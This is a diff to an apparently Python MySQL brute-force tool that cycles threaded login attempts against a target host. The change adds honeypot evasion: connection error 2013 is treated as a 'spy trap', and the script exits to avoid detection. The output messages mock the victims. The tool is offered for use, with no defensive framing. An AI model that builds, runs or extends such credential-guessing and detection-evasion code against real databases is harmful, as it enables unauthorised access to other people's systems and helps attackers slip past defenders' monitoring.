@@ -12,6 +12,7 @@ from threading import Thread, activeCount
 
 status = False
 allowed = True
+honeypot = False
 
 # Get current time in formatted form.
 def curTime():
@@ -47,13 +48,16 @@ def file_exists(parser, file):
 	return [x.strip() for x in open(file)]
 
 def connect(host, user, password, port):
-	global status, allowed
+	global status, allowed, honeypot
 	try:
 		conn = MySQLdb.connect(host=host, port=port, user=user, password=password, connect_timeout=3)
 		showSuccess("Login Success! {} : {}".format(user, password))
 		status = True
 	except Exception as e:
 		errno, message = e.args
+		if errno == 2013:
+			showFailure("Comrade! {}:{} is probably western spy trap (honeypot) !".format(host, port))
+			honeypot = True
 		if errno == 1130:
 			showFailure("Comrade! Host {}:{} doesn't allow us to access user {}".format(host, port, user))
 			allowed = False
@@ -77,6 +81,9 @@ def main(args):
 				showSuccess("Successfully made their MySQL to OurSQL!")
 				exitScript()
 			if not allowed:
+				showFailure("Ah... blyat!")
+				exitScript()
+			if honeypot:
 				showFailure("Ah... blyat!")
 				exitScript()
 			th = Thread(target=connect, args=(host, user, password, port))
